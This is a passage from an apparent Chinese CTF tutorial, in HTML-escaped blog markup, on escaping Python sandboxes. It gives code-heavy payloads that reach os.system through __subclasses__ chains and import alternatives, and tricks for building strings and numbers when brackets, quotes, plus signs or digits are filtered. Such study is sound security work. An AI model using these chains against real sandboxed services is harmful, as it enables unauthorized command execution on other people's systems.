&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;__import__&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;os&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h5 id=&#34;importlibimport_module&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#importlibimport_module&#34;&gt;#&lt;/a&gt; importlib.import_module&lt;/h5&gt;
&lt;p&gt;不过 importlib 也需要导入，所以有些鸡肋.&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; importlib&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;importlib.import_module(&lt;span class=&#34;string&#34;&gt;&amp;#x27;os&amp;#x27;&lt;/span&gt;).system(&lt;span class=&#34;string&#34;&gt;&amp;#x27;ls&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;注意：importlib 需要进行导入之后才能够使用&lt;/p&gt;
&lt;h5 id=&#34;__loader__load_module&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#__loader__load_module&#34;&gt;#&lt;/a&gt;  &lt;code&gt;__loader__.load_module&lt;/code&gt;&lt;/h5&gt;
&lt;p&gt;如果使用 audithook 的方式进行过滤，上面的两种方法就无法使用了，但是  &lt;code&gt;__loader__.load_module&lt;/code&gt;  底层实现与 import 不同，因此某些情况下可以绕过.&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;__loader__.load_module(&lt;span class=&#34;string&#34;&gt;&amp;#x27;os&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;module &lt;span class=&#34;string&#34;&gt;&amp;#x27;os&amp;#x27;&lt;/span&gt; (built-&lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt;)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;过滤了&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过滤了&#34;&gt;#&lt;/a&gt; 过滤了 []&lt;/h4&gt;
&lt;p&gt;如果中括号被过滤了，则可以使用如下的两种方式来绕过：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;调用 &lt;code&gt;__getitem__()&lt;/code&gt;  函数直接替换；#  &lt;code&gt;[x]&lt;/code&gt;  &amp;lt;=&amp;gt;  &lt;code&gt;__getitem__(x)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;调用 pop () 函数（用于移除列表中的一个元素，默认最后一个元素，&lt;strong&gt;并且返回该元素的值&lt;/strong&gt;）替换；&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__mro__[-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;].__subclasses__()[&lt;span class=&#34;number&#34;&gt;200&lt;/span&gt;].__init__.__globals__[&lt;span class=&#34;string&#34;&gt;&amp;#x27;__builtins__&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;__import__&amp;#x27;&lt;/span&gt;](&lt;span class=&#34;string&#34;&gt;&amp;#x27;os&amp;#x27;&lt;/span&gt;).system(&lt;span class=&#34;string&#34;&gt;&amp;#x27;ls&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# __getitem__()替换中括号[]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__mro__.__getitem__(-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;).__subclasses__().__getitem__(&lt;span class=&#34;number&#34;&gt;200&lt;/span&gt;).__init__.__globals__.__getitem__(&lt;span class=&#34;string&#34;&gt;&amp;#x27;__builtins__&amp;#x27;&lt;/span&gt;).__getitem__(&lt;span class=&#34;string&#34;&gt;&amp;#x27;__import__&amp;#x27;&lt;/span&gt;)(&lt;span class=&#34;string&#34;&gt;&amp;#x27;os&amp;#x27;&lt;/span&gt;).system(&lt;span class=&#34;string&#34;&gt;&amp;#x27;ls&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# pop()替换中括号[]，结合__getitem__()利用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__mro__.__getitem__(-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;).__subclasses__().pop(&lt;span class=&#34;number&#34;&gt;200&lt;/span&gt;).__init__.__globals__.pop(&lt;span class=&#34;string&#34;&gt;&amp;#x27;__builtins__&amp;#x27;&lt;/span&gt;).pop(&lt;span class=&#34;string&#34;&gt;&amp;#x27;__import__&amp;#x27;&lt;/span&gt;)(&lt;span class=&#34;string&#34;&gt;&amp;#x27;os&amp;#x27;&lt;/span&gt;).system(&lt;span class=&#34;string&#34;&gt;&amp;#x27;ls&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;getattr&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__mro__.__getitem__(-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;).__subclasses__().__getitem__(&lt;span class=&#34;number&#34;&gt;200&lt;/span&gt;).__init__.__globals__,&lt;span class=&#34;string&#34;&gt;&amp;#x27;__builtins__&amp;#x27;&lt;/span&gt;).__getitem__(&lt;span class=&#34;string&#34;&gt;&amp;#x27;__import__&amp;#x27;&lt;/span&gt;)(&lt;span class=&#34;string&#34;&gt;&amp;#x27;os&amp;#x27;&lt;/span&gt;).system(&lt;span class=&#34;string&#34;&gt;&amp;#x27;ls&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;过滤了-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过滤了-2&#34;&gt;#&lt;/a&gt; 过滤了 ‘’&lt;/h4&gt;
&lt;h5 id=&#34;str-函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#str-函数&#34;&gt;#&lt;/a&gt; str 函数&lt;/h5&gt;
&lt;p&gt;如果过滤了引号，我们 payload 中构造的字符串会受到影响。其中一种方法是使用 str () 函数获取字符串，然后索引到预期的字符。将所有的字符连接起来就可以得到最终的字符串。&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;().__class__.__new__&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;built-&lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; method __new__ of &lt;span class=&#34;built_in&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;object&lt;/span&gt; at &lt;span class=&#34;number&#34;&gt;0x9597e0&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(().__class__.__new__)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;built-in method __new__ of type object at 0x9597e0&amp;gt;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(().__class__.__new__)[&lt;span class=&#34;number&#34;&gt;21&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;w&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(().__class__.__new__)[&lt;span class=&#34;number&#34;&gt;21&lt;/span&gt;]+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(().__class__.__new__)[&lt;span class=&#34;number&#34;&gt;13&lt;/span&gt;]+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(().__class__.__new__)[&lt;span class=&#34;number&#34;&gt;14&lt;/span&gt;]+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(().__class__.__new__)[&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;]+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(().__class__.__new__)[&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;]+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(().__class__.__new__)[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;whoami&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h5 id=&#34;chr-函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#chr-函数&#34;&gt;#&lt;/a&gt; chr 函数&lt;/h5&gt;
&lt;p&gt;也可以使用 chr 加数字来构造字符串&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;56&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;8&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;d&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;dddddddddddddddddddddddddddddddddddddddd&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h5 id=&#34;list-dict&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#list-dict&#34;&gt;#&lt;/a&gt; list + dict&lt;/h5&gt;
&lt;p&gt;使用 dict 和 list 进行配合可以将变量名转化为字符串，但这种方式的弊端在于字符串中不能有空格等。&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;dict&lt;/span&gt;(whoami=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] &lt;span class=&#34;comment&#34;&gt;# 返回whoami&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h5 id=&#34;__doc__&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#__doc__&#34;&gt;#&lt;/a&gt;  &lt;code&gt;__doc__&lt;/code&gt;&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;__doc__&lt;/code&gt;  变量可以获取到类的说明信息，从其中索引出想要的字符然后进行拼接就可以得到字符串：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;().__doc__.find(&lt;span class=&#34;string&#34;&gt;&amp;#x27;s&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;().__doc__[&lt;span class=&#34;number&#34;&gt;19&lt;/span&gt;]+().__doc__[&lt;span class=&#34;number&#34;&gt;86&lt;/span&gt;]+().__doc__[&lt;span class=&#34;number&#34;&gt;19&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h5 id=&#34;bytes-函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#bytes-函数&#34;&gt;#&lt;/a&gt; bytes 函数&lt;/h5&gt;
&lt;p&gt;bytes 函数可以接收一个 ascii 列表，然后转换为二进制字符串，再调用 decode 则可以得到字符串&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;([&lt;span class=&#34;number&#34;&gt;115&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;121&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;115&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;116&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;101&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;109&lt;/span&gt;]).decode()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;过滤了-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过滤了-3&#34;&gt;#&lt;/a&gt; 过滤了 +&lt;/h4&gt;
&lt;p&gt;过滤了 + 号主要影响到了构造字符串，假如题目过滤了引号和加号，构造字符串还可以使用 join 函数，初始的字符串可以通过 str () 进行获取。具体的字符串内容可以从  &lt;code&gt;__doc__&lt;/code&gt;  中取，&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;().join(().__doc__[&lt;span class=&#34;number&#34;&gt;19&lt;/span&gt;],().__doc__[&lt;span class=&#34;number&#34;&gt;23&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;过滤了数字&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过滤了数字&#34;&gt;#&lt;/a&gt; 过滤了数字&lt;/h4&gt;
&lt;p&gt;如果过滤了数字的话，可以使用一些函数的返回值获取。例如：&lt;br&gt;
0： &lt;code&gt;int(bool([]))&lt;/code&gt; 、 &lt;code&gt;Flase&lt;/code&gt; 、 &lt;code&gt;len([])&lt;/code&gt; 、 &lt;code&gt;any(())&lt;/code&gt; &lt;br&gt;
1： &lt;code&gt;int(bool([&amp;quot;&amp;quot;]))&lt;/code&gt; 、 &lt;code&gt;True&lt;/code&gt; 、 &lt;code&gt;all(())&lt;/code&gt; 、 &lt;code&gt;int(list(list(dict(a၁=())).pop()).pop())&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;有了 0 之后，其他的数字可以通过运算进行获取：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;0 ** 0 == 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1 + 1 == 2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2 + 1 == 3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2 ** 2 == 4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;当然，也可以直接通过 repr 获取一些比较长字符串，然后使用 len 获取大整数。&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;repr&lt;/span&gt;(&lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;repr&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;bytearray&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;19&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;第三种方法，可以使用 len + dict + list 来构造，这种方式可以避免运算符的的出现&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; -&amp;gt; &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;([])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; -&amp;gt; &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;dict&lt;/span&gt;(aa=()))[&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;([])])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; -&amp;gt; &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;dict&lt;/span&gt;(aaa=()))[&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;([])])&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;第四种方法: unicode&lt;/p&gt;
&lt;h4 id=&#34;过滤了空格&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过滤了空格&#34;&gt;#&lt;/a&gt; 过滤了空格&lt;/h4&gt;
&lt;p&gt;通过 (),[] 代替&lt;/p&gt;
&lt;h4 id=&#34;过滤了运算符&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过滤了运算符&#34;&gt;#&lt;/a&gt; 过滤了运算符&lt;/h4&gt;
&lt;p&gt;== 可以用 in 代替&lt;/p&gt;
&lt;p&gt;or 可以用 | + -。。。- 来替换&lt;/p&gt;
&lt;p&gt;例如&lt;/p&gt;
